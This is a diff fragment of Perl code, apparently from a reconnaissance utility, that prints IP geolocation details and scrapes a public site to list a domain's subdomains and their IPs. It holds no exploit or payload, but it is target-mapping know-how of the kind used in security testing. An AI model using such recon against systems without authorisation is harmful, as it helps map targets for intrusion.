+        }if($response =~/region": "(.*?)"/){
+            print item(),"Region: $1\n";
+        }if($response =~/region_code": "(.*?)"/){
+            print item(),"Region Code: $1\n";
+        }if($response =~/continent_code": "(.*?)"/){
+            print item(),"Continent Code: $1\n";
+        }if($response =~/postal": "(.*?)"/){
+            print item(),"Postal Code: $1\n";
+        }if($response =~/latitude": (.*?),/){
+            print item(),"Latitude / Longitude: $1, ";
+        }if($response =~/longitude": (.*?),/){
+            print color("bold white"),"$1\n";
+        }if($response =~/timezone": "(.*?)"/){
+            print item(),"Timezone: $1\n";
+        }if($response =~/utc_offset": "(.*?)"/){
+            print item(),"Utc Offset: $1\n";
+        }if($response =~/country_calling_code": "(.*?)"/){
+            print item(),"Calling Code: $1\n";
+        }if($response =~/currency": "(.*?)"/){
+            print item(),"Currency: $1\n";
+        }if($response =~/languages": "(.*?)"/){
+            print item(),"Languages: $1\n";
+        }if($response =~/asn": "(.*?)"/){
+            print item(),"ASN: $1\n";
+        }if($response =~/org": "(.*?)"/){
+            print item(),"ORG: $1\n";
+        }
+    }else {
+        print item(),"There Is A Problem\n\n";
+        print item('1'),"Checking The Connection\n";
+        print item('2'),"Enter Website Without HTTP/HTTPs\n";
+        print item('3'),"Check If Website/IP Working\n";
+    }
+}
+
+sub subdomain {
+    $url = "https://www.pagesinventory.com/search/?s=$site";
+    $request = $ua->get($url);
+    $response = $request->content;
+
+    $ip= (gethostbyname($site))[4];
+    my ($a,$b,$c,$d) = unpack('C4',$ip);
+    $ip_address ="$a.$b.$c.$d";
+    if($response =~ /Search result for/){
+        print item(),"Website: $site\n";
+        print item(),"IP: $ip_address\n\n";
+
+        while($response =~ m/<td><a href=\"\/domain\/(.*?).html\">(.*?)<a href="\/ip\/(.*?).html">/g ) {
+
+            print item(),"Subdomain: $1\n";
+            print item('-'),"IP: $3\n\n";
+            sleep(1);
+        }
+    }elsif($ip_address =~ /[0-9]/){
+        if($response =~ /Nothing was found/){
+            print item(),"Website: $site\n";
+            print item(),"IP: $ip_address\n\n";
+            print item(),"No Subdomains Found For This Domain\n";
+        }}else {
+        print item(),"There Is A Problem\n\n";
+        print item('1'),"Checking The Connection\n";
+        print item('2'),"Enter Website Without HTTP/HTTPs\n";
+        print item('3'),"Check If Website Working\n";
+    }
 }
